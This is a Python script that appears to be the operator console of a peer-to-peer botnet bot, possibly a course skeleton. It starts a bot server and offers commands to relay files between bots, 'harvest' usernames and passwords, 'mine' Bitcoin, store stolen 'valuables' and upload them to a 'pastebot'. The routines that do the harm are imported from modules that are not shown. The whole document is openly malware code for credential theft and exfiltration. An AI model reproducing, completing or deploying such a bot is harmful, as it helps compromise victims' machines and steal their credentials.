import socket
import time
import threading

# Importing necessary functions from custom libraries
from lib.evil import bitcoin_mine, harvest_user_pass
from lib.p2p import find_bot, bot_server
from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, valuables

# Function to handle peer-to-peer file upload
def p2p_upload(filename):
    if filename not in filestore:
        print("The specified file does not exist in the botnet's filestore.")    
        return

    # Finding a bot to establish a connection
    sconn = find_bot()
    sconn.send(bytes("FILE", "ascii"))
    p2p_upload_file(sconn, filename)

# Function to handle peer-to-peer echoing
def p2p_echo():
    try:
        # Finding a bot to establish a connection
        sconn = find_bot()
        sconn.verbose = True
        sconn.send(bytes("ECHO", "ascii"))

        # Continuously sending and receiving messages
        while True:
            msg = input("Echo> ")
            byte_msg = bytes(msg, "ascii")
            sconn.send(byte_msg)
            echo = sconn.recv()
            assert echo == byte_msg

            # Exiting if the user wants to quit
            if msg.lower() in ('x', 'exit', 'quit'):
                sconn.close()
                break
    except socket.error:
        print("Connection closed unexpectedly")

if __name__ == "__main__":
    # Starting the bot server in a separate thread
    thr = threading.Thread(target=bot_server)
    thr.setDaemon(True)
    thr.start()

    # Giving some time for the bot server to initialize
    time.sleep(0.3)

    # Main command loop
    while True:
        raw_cmd = input("Enter command: ")
        cmd = raw_cmd.split()

        if not cmd:
            print("Please enter a command.")
            continue

        # Handling various commands
        if cmd[0].lower() == "p2p":
            if len(cmd) > 1:
                if cmd[1].lower() == "echo":
                    p2p_echo()
                if cmd[1].lower() == "upload":
                    if len(cmd) == 3:
                        p2p_upload(cmd[2])
                    else:
                        print("Usage: 'p2p upload <filename>'")
            else:
                print("The 'p2p' command requires either 'echo' or 'upload' after it.")
        elif cmd[0].lower() == "download":
            if len(cmd) == 2:
                download_from_pastebot(cmd[1])
            else:
                print("Usage: 'download <filename>'")
        elif cmd[0].lower() == "upload":
            if len(cmd) == 2:
                upload_valuables_to_pastebot(cmd[1])
            else:
                print("Usage: 'upload <filename>'")
        elif cmd[0].lower() == "mine":
            print("Mining for Bitcoins...")
            bit_addr = bitcoin_mine()
            save_valuable("Bitcoin: %s" % bit_addr)
            print("Mined and found Bitcoin address: %s" % bit_addr)
        elif cmd[0].lower() == "harvest":
            userpass = harvest_user_pass()
            save_valuable("Username/Password: %s %s" % userpass)
            print("Found user pass: %s" % (userpass,))
        elif cmd[0].lower() == "list":
            print("Files stored by this bot: %s" % ", ".join(filestore.keys()))  
            print("Valuables stored by this bot: %s" % valuables)
        elif cmd[0].lower() in ("quit", "exit"):
            break
        else:
            print("Command not recognized.")
